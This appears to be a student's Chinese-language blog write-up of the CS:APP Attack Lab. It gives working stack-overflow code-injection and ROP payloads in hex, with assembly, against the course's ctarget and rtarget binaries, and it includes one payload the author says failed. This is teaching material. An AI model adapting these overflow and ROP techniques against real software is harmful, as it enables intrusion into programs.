@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="xia0ji233" />
+
+
+
+<meta name="description" content="今天来康康attack lab啊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="attacklab实验报告:代码注入以及rop攻击">
+<meta property="og:url" content="http://example.com/2021/04/25/attqacklab/index.html">
+<meta property="og:site_name" content="xia0ji233&#39;s Blog">
+<meta property="og:description" content="今天来康康attack lab啊">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/tsoDagXldAT5NYC.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/vY3tahzlkjQudCZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/LAOwMRtHp97zThr.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/51MLvTDFXRdAIjK.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/b7dpJR2DMv8N3k5.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/mbuiMhVOGQY2Tca.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/R37sHQJ1e5FWf2n.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/kCrAciSvRxqJgWs.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/Sl1a8dpCuFRA7jO.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/PiXlM34VsBgL1qT.png">
+<meta property="article:published_time" content="2021-04-25T14:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-25T05:22:05.955Z">
+<meta property="article:author" content="xia0ji233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="xia0ji233&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>attacklab实验报告:代码注入以及rop攻击 | xia0ji233&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-attqacklab" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/25/attqacklab/" class="article-date">
+      <time datetime="2021-04-25T14:00:00.000Z" itemprop="datePublished">2021-04-25</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      attacklab实验报告:代码注入以及rop攻击
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/csapp/">csapp</a><a class="article-category-link" href="/categories/csapp/lab/">lab</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>今天来康康attack lab啊</p>
+<span id="more"></span>
+
+<h2 id="Ctarget"><a href="#Ctarget" class="headerlink" title="Ctarget"></a>Ctarget</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>题目给出函数<code>test</code>，<code>test</code>里面有函数<code>getbuf</code>，然后它给定的提权函数是<code>touch1()</code>，我们那我们先<code>gdb ctarget</code>进入调试，然后输入<code>disassemble getbuf</code>查看汇编代码。</p>
+<p><img src="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png" alt="attacklab_Ctarget_level1_1.png"></p>
+<p>可以很清楚的看到函数的缓冲区大小是<code>0x28</code>字节，然后<code>gets</code>已经说明是库的标准函数了，<code>gets</code>函数是有漏洞的，它在读入字符串的时候不会对长度检测，而是给多少读多少。那么我们可以用这个<code>gets</code>来实现栈溢出，执行我们的权限函数<code>touch1()</code>，我们可以先用<code>00</code>字节填充<code>40</code>个字节，然后再加上<code>shell</code>函数的地址。注意前面可以用除了<code>0a</code>的任意字节填充，因为<code>0a</code>代表<code>’\n’</code>的意思，<code>gets</code>函数一旦读到这个字符就会认为字符串读取结束了。我们用<code>print touch1</code>去查看该函数的地址。</p>
+<p><img src="https://i.loli.net/2021/04/26/tsoDagXldAT5NYC.png" alt="attacklab_ctarget_level1_2.png"></p>
+<p>发现了提权函数的地址之后我们就可以构造<code>payload</code>了。我们先<code>q</code>退出<code>gdb</code>，然后这里先创建一个文本文件<code>vim attack1.txt</code> 然后填充</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure>
+
+<p>注意，地址在计算机里是<strong>小端序</strong>存储。也就是<strong>高地址存储高位字节</strong>，然后我们构造的<code>payload</code>是往<strong>栈底方向</strong>填充的，而栈又是<strong>向低地址增长</strong>的，因此如此反转过后我们的函数地址要按字节倒着填充。然后根据字节生成字符串文件。</p>
+<p>运行题目给的<code>hex2raw</code>文件，<code>./hex2raw &lt;source file&gt; target file</code>命令去生成目标文件。然后再<code>./ctarget -q -i target file</code>这里我生成的文件名叫<code>attackraw1.txt</code>，然后终端输入运行命令，发现攻击成功了。</p>
+<p><img src="https://i.loli.net/2021/04/26/vY3tahzlkjQudCZ.png" alt="attacklab_ctarget_level1_3.png"></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>这个需要攻击执行的函数名为<code>touch2()</code>，这个栈溢出的漏洞依然可以利用。但是<code>print touch2</code>之后你就会发现，<code>touch2</code>比<code>touch1</code>多了一个参数。故技重施之后发现：</p>
+<p><img src="https://i.loli.net/2021/04/26/LAOwMRtHp97zThr.png" alt="attacklab_ctarget_level2_1.png"></p>
+<p>虽然我们成功执行了<code>touch2()</code>函数，但是还是失败了，发现<code>touch2()</code>事实上那个参数是用来检测是否与<code>cookie</code>匹配的，而<code>cookie</code>的值已经告诉你了。在32位的程序里面，我们可以往返回地址后面写上<code>cookie</code>作为参数，但是64位程序前6个参数采用寄存器传参，那么要成功攻击就必须修改<code>rdi</code>寄存器的值为<code>cookie</code>。因为我们直接在返回位置覆盖函数地址，跟普通调用的区别就少了参数的传递，所以rdi的值至少在执行getbuf函数的时候不会看遍，这里有40字节大小的栈空间，那么我们就可以往栈中注入代码，代码应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line"></span><br><span class="line">call $touch2</span><br></pre></td></tr></table></figure>
+
+<p><code>call</code>命令的操作数是根据<code>rip</code>偏移来的，那确定不了这个偏移，就没办法准确的<code>call</code>到这个<code>touch2()</code>函数，那么换一个思路：先往栈上堆返回地址，再返回<code>ret</code>弹出返回，那么我们在往栈上注入代码就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>就完成了，再加上填充字节总共40字节再在末尾返回栈地址就可以直接执行刚刚注入的代码了。我们接下来就要确定栈的地址了。<code>gdb ctarget </code>然后在<code>getbuf</code>这里下断点.<code>r -q</code>运行到<code>sub rsp,0x28</code>这一步我们观察栈指针的位置</p>
+<p><img src="https://i.loli.net/2021/04/26/51MLvTDFXRdAIjK.png" alt="attacklab_ctarget_level2_2.png"></p>
+<p>那么我们可以在返回地址的位置指向栈中我们堆的代码的位置，让它执行这些指令，以此达到传参且执行函数的目的。依然要注意小端问题。接下来我们只需要解决一个问题：如何把汇编代码转换为字节码？</p>
+<p>先<code>vim 1.s</code>，填入汇编代码，然后<code>gcc -c 1.s -o 1.o</code>汇编之后，再<code>objdump -d 1.o</code>反汇编就可以查看汇编代码的字节码了。</p>
+<p><img src="https://i.loli.net/2021/04/26/b7dpJR2DMv8N3k5.png" alt="attacklab_ctarget_level2_4.png"></p>
+<p>易得<code>payload</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，攻击成功了。</p>
+<p><img src="https://i.loli.net/2021/04/26/mbuiMhVOGQY2Tca.png" alt="attacklab_ctarget_level2_3.png"></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>这里的提权函数是<code>touch3</code>，<code>writeup</code>中已经给了我们函数的语句(Ps:我做到这里才知道writeup是说明的意思qwq)。</p>
+<p><img src="https://i.loli.net/2021/04/26/R37sHQJ1e5FWf2n.png" alt="attacklab_Ctarget_level3_1.png"></p>
+<p>要求<code>hexmatch</code>函数返回<code>true</code>，这次攻击才能成功，题目也给了我们这个函数的语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall hexmatch(unsigned int val, char *sval)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v2; // rbx</span><br><span class="line">  char cbuf[110]; // [rsp+0h] [rbp-98h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+78h] [rbp-20h]</span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = &amp;cbuf[random() % 100];</span><br><span class="line">  __sprintf_chk(v2, 1LL, -1LL, &quot;%.8x&quot;, val);</span><br><span class="line">  return strncmp(sval, v2, 9uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数两个输入，一个就是<code>val</code>，那么实参就是<code>cookie</code>的值，已经确定了改不了了，<code>sval</code>参数是<code>touch3()</code>原参数给的，因此我们在<code>call touch3</code>的时候给<code>rdi</code>传的参数就可以是<code>hexmatch</code>的第二个参数。中间有一步是徐晃一枪，那就是这个随机函数了，但是接下来有一个<code>sprintf</code>函数，<code>sprintf</code>函数是将格式化字符串输出给<code>s</code>。那么把<code>val</code>以<code>8</code>位十六进制数给<code>s</code>的意思就是<code>s=&quot;59b997fa&quot;</code>,所以<code>s</code>字符串看似随机实则固定的。字符串传参是传字符串首字符的<code>char</code>指针，数值为首字符到<code>’\0’</code>之间的所有字符（大端序）。那么我们构造的<code>sval</code>字符串的字节码就要应该是：<code>35 39 62 39 39 37 66 61</code>，知道了要构造的字符串之后还要想办法将它作为参数传到<code>rdi</code>里面。我们可以将它保存到栈中的某个位置，因为在调用函数的时候<code>getbuf</code>栈帧的部分可能会因为正常调用<code>hexmatch</code>函数被破坏，所以我们在缓冲区下<code>4</code>个字节填充所需的字符串，就算破坏其它栈帧也没有关系，只要能执行就<code>ok</code>。那么很容易构造<code>payload</code>：在这里要注入的代码跟原来差不多，只是参数要变成<code>cookie</code>字符串的首地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+
+<p>注意最后一位要<code>00</code> 填充，因为字符串是要到<code>00</code>才结束的，如果不是那么就会一直进行下去。</p>
+<h2 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h2><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>这个官方的<code>writeup</code>已经明确说了，栈只读，因此得采取<code>rop</code>的方式取攻击执行<code>touch2()</code>。</p>
+<p>我们使用<code>objdump -d rtarget</code>去查看代码碎片看看哪里可以利用。首先我们想的应该是，<code>movq $0x59b997fa,%rdi</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>但是发现你根本找不到<code>movq $0x59b997fa,%rdi</code>，所以这个方法略掉。</p>
+<p>那还有<code>plan B</code>：在栈上<code>rsp</code>里面装入那个数然后<code>popq</code>弹到<code>rdi</code>里面就好了，那么我们想的就是，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>我们搜索一下<code>popq %rdi </code>的字节码<code>5f</code>，发现<code>0x40233a</code>有一个5f的</p>
+<p>那就很容易构造<code>payload</code>了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3a 23 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/26/kCrAciSvRxqJgWs.png" alt="attacklab_rtarget_level2_1.png"></p>
+<p>事实上这里我是没有攻击成功的，我觉得从逻辑上来讲是没有任何问题的，有大佬看到蒟蒻的小错误恳请帮忙指正。那么正确的做法是先把它pop到rax寄存器里面，然后执行<code>movq %rax,%rdi</code>然后再<code>ret touch3()</code>？？？到底有啥区别嘛，还是搞不懂。。</p>
+<p>那么代码就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>构造出来的payload就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>这个应该不难，但是我还是想知道我的哪里有问题！！！</p>
+<h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>首先想想我们要干嘛？构造在一个特殊的地方构造字符串然后把字符串字符首地址传给<code>rdi</code>就能直接攻击成功。开启了栈只读和地址随机化，那么我们还是只能通过栈去溢出，肯定是要先把字符串写在后面，中间全是<code>gadget</code>。然后通过确定<code>rsp</code>的值以及我们已构造的<code>gadget</code>，我们就可以很轻松地获得字符串地址。</p>
+<p>那么我们需要的汇编代码就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//movq %rsp,%rdi</span><br><span class="line">movq %rsp,%raxa</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">add $offset,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>这里主要是add这条指令，别问我为什么刚才的思路打断了，都是上面那个<code>level2</code>搞得，就佛系一点把，先把它传给<code>rax</code>再给<code>rdi</code>也一样的，即使我不知道一步到位为什么不行。接下来是寻找<code>gadget</code>了。其它的都能很好找到，唯独<code>add</code>这条指令不好搞，但是我们可以大致看一下规律。</p>
+<p><img src="https://i.loli.net/2021/04/26/Sl1a8dpCuFRA7jO.png" alt="attacklab_rtarget_level3_1.png"></p>
+<p>我们可以很清晰地发现，<code>add $xxx,%rdi</code>的一般规律就是 <code>48 83 c7</code> 然后后面一个字节确定立即数的大小那么就去搜索一下<code>48 83 c7</code>，但是很快就会发现，搜不到这个<code>gadget</code>。那么换一种思路，既然我们先传给了<code>rax</code>那我们可以先让<code>rax</code>加上那个值啊。说干就干，汇编再反之后得到字节码<code>48 05 00</code>发现还是找不到，一筹莫展之际，你突然想到，可以利用寄存器的低位，他们的操作码也有很大区别的，比如<code>rax</code>的低32位是<code>eax</code>，低16位是<code>ax</code>，低8位是<code>al</code>，我们一个个找过去发现add al有一个。04 37 这刚好是al+0x37的gadget。</p>
+<p><img src="https://i.loli.net/2021/04/26/PiXlM34VsBgL1qT.png" alt="attacklab_rtarget_level3_2.png"></p>
+<p>这个大小也是非常合适的，在尽量保证能够全覆盖的情况下保证<code>payload</code>越小越好，大了容易出事。</p>
+<p>那么如此我们就只到我们重新堆的代码结构了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">add $0x37,al</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00// movq %rsp,%rax</span><br><span class="line">d8 19 40 00 00 00 00 00// add $0x37,al</span><br><span class="line">c5 19 40 00 00 00 00 00// movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00//touch3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 35//cookie</span><br><span class="line">39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p>然后完结撒花啦！！</p>
+<p>第一次能自己写完csapp的lab，虽然难，但是收获颇丰，若有不正，恳请指正！！</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/04/25/attqacklab/">attacklab实验报告:代码注入以及rop攻击</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2021-04-25, 22:00:00</p>
+        <p><span>最后更新:</span>2021-10-25, 13:22:05</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/04/25/attqacklab/" title="attacklab实验报告:代码注入以及rop攻击">http://example.com/2021/04/25/attqacklab/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/04/25/attqacklab/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/04/30/buflab/">
+                    bufblab实验报告:32位程序缓冲区溢出攻击
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/04/19/bomblab/">
+                    bomblab实验报告:二进制安全与逆向分析
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ctarget"><span class="toc-number">1.</span> <span class="toc-text">Ctarget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-number">1.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-number">1.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-number">1.3.</span> <span class="toc-text">level3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rtarget"><span class="toc-number">2.</span> <span class="toc-text">rtarget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2-1"><span class="toc-number">2.1.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3-1"><span class="toc-number">2.2.</span> <span class="toc-text">level3</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"attacklab实验报告:代码注入以及rop攻击　| xia0ji233's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/04/30/buflab/" title="上一篇: bufblab实验报告:32位程序缓冲区溢出攻击">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/04/19/bomblab/" title="下一篇: bomblab实验报告:二进制安全与逆向分析">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
